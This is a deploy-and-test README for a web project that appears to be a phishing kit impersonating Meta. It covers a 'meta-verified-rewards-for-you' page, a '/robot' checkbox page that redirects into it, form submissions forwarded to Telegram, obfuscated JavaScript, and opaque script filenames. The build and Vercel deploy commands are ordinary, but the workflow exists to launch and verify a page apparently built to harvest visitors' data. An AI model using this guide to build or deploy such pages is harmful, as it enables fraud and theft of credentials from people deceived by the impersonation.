# Test deploy workflow

## Step 1 — Test build locally

```bash
npm run clean
# or (Windows)
rmdir /s /q dist

npm run build
# or
build.bat
```

### Check `dist/`:

```
dist/
├── index.html          ✓
├── meta-verified-rewards-for-you.html       ✓
├── build-info.json     ✓
└── public/
    ├── js/
    │   ├── bundle-app.js   ✓ (obfuscated in default build)
    │   └── bundle-index.js ✓ (obfuscated in default build)
    ├── i18n/           ✓ (l8q3m5r2.js, a4v9x1k7.js, e6f2b8d0.js)
    ├── styles/         ✓
    ├── meta/           ✓
    └── *.png, *.svg    ✓
```

## Step 2 — Test from `dist/` locally

Open in a browser:

- `dist/index.html`  
- `dist/meta-verified-rewards-for-you.html`  

### Checklist

- [ ] `index.html` loads  
- [ ] Checkbox works  
- [ ] Checkbox redirects toward `meta-verified-rewards-for-you.html` flow  
- [ ] `meta-verified-rewards-for-you.html` loads  
- [ ] Modals open  
- [ ] Form submit works  
- [ ] Telegram notification (if configured)  

## Step 3 — Deploy to Vercel

**CLI**

```bash
vercel --prod
```

**Git**

```bash
git add .
git commit -m "Deploy"
git push
```

## Step 4 — Test on Vercel

```
https://your-project.vercel.app           → index.html ✓
https://your-project.vercel.app/robot     → index.html ✓
https://your-project.vercel.app/meta-verified-rewards-for-you  → meta-verified-rewards-for-you.html ✓
```

### Online checklist

- [ ] Root loads `index.html`  
- [ ] `/robot` loads `index.html`  
- [ ] `/meta-verified-rewards-for-you` loads `meta-verified-rewards-for-you.html`  
- [ ] No unexpected 404s  
- [ ] JS loads (Network tab)  
- [ ] CSS loads  
- [ ] Images load  
- [ ] Forms work  
- [ ] Telegram (if used)  

---

## Troubleshooting

**Local build fails**

```bash
npm install
node build.js
```

**404 on Vercel**

```bash
cat vercel.json
vercel logs
ls -R dist/
```

**JS/CSS not loading**

- Open DevTools (F12)  
- Confirm script/link paths (e.g. `/public/js/...` per current HTML)  
- See `JS_MANIFEST.txt` for opaque JS names  

**Vercel build fails**

- `buildCommand` should be `npm run build`  
- `package.json` should include `"build": "node build.js --obfuscate"`  
- Dependencies should be under `dependencies` if the platform needs them at build time  

---

## Full workflow

```
1. Edit → public/js/*.js
2. Build → npm run build
3. Test local → dist/index.html
4. Deploy → vercel --prod
5. Test live → https://your-project.vercel.app
```

---

## Optional: `deploy.bat`

```batch
@echo off
echo Building...
call npm run build

echo Deploying...
call vercel --prod

echo Done!
pause
```

Run `deploy.bat` from the project root.

Happy testing.
